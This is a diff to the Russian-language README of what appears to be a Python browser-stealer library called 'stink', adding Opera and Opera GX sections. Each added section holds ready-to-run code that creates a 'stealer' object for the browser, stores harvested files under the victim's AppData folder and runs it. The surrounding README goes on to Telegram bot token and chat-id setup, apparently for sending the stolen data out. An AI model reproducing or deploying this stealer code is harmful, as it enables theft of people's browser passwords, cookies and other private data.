@@ -13,6 +13,8 @@
   * [Стандартный](#Стандартный)
   * [Кастомный](#Кастомный)
     * [Chrome](#Chrome)
+    * [Opera](#Opera)
+    * [Opera](#Opera)
 * [Настройка Telegram бота](#Настройка-Telegram-бота)
   * [Получение токена](#Получение-токена)
   * [Получение айди](#Получение-айди)
@@ -60,7 +62,40 @@ if not path.exists(storage_path + storage_folder):
 stealer = Chrome(storage_path=storage_path, storage_folder=storage_folder)
 stealer.run()
 ```
+#### Opera
+```
+from os import path, mkdir
 
+from stink.browsers.opera_default import Opera_Default
+from getpass import getuser
+
+storage_path = f"C:/Users/{getuser()}/AppData/"
+storage_folder = "files/"
+
+if not path.exists(storage_path + storage_folder):
+
+    mkdir(storage_path + storage_folder)
+
+stealer = Opera_Default(storage_path=storage_path, storage_folder=storage_folder)
+stealer.run()
+```
+#### Opera GX
+```
+from os import path, mkdir
+
+from stink.browsers.opera_gx import Opera_GX
+from getpass import getuser
+
+storage_path = f"C:/Users/{getuser()}/AppData/"
+storage_folder = "files/"
+
+if not path.exists(storage_path + storage_folder):
+
+    mkdir(storage_path + storage_folder)
+
+stealer = Opera_GX(storage_path=storage_path, storage_folder=storage_folder)
+stealer.run()
+```
 ## Настройка Telegram бота
 ### Получение токена
 1. Открываем чат с [BotFather](https://t.me/botfather).
